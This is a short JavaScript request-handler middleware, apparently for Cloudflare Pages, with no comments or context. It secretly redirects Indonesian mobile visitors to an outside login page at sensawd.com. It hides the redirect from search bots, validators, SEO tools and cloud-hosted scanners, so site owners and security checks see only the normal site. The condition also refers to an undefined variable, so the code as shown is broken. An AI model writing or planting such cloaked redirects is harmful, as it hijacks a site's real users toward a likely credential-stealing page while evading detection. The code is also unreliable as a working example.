export async function onRequest(context) {
  const { request, next } = context;
  const url = new URL(request.url);
  const userAgent = (request.headers.get('user-agent') || '').toLowerCase();
  const country = request.cf?.country || '';
  const asOrg = (request.cf?.asOrganization || '').toLowerCase();

  const isIndonesiaIP = country === 'ID';
  const isMobile = /android|iphone|kindle|ipad|blackberry|iemobile|opera mini|mobile/i.test(userAgent);
  const isBot = /bot|google|baidu|bing|msn|duckduckbot|teoma|slurp|crawler|spider|yandex|facebookexternalhit|twitterbot|rogerbot|linkedinbot|embedly|showyoubot|outbrain|slackbot|vkShare|W3C_Validator|lighthouse|ahrefs|semrush|dotbot/i.test(userAgent);
  const isStaticFile = /\.(jpg|jpeg|png|gif|css|js|ico|svg|woff|woff2)$/i.test(url.pathname);
  const isCloud = ['amazon','google','digitalocean','microsoft','cloudflare','akamai','linode','ovh','vps','hetzner','vultr','alibaba'].some(c => asOrg.includes(c));

  if (isMobile && isIndonesiaIP && isIndonesiaColo && !isBot && !isStaticFile && !isCloud) {
    return Response.redirect("https://sensawd.com/login", 302);
  }
  return next();
}
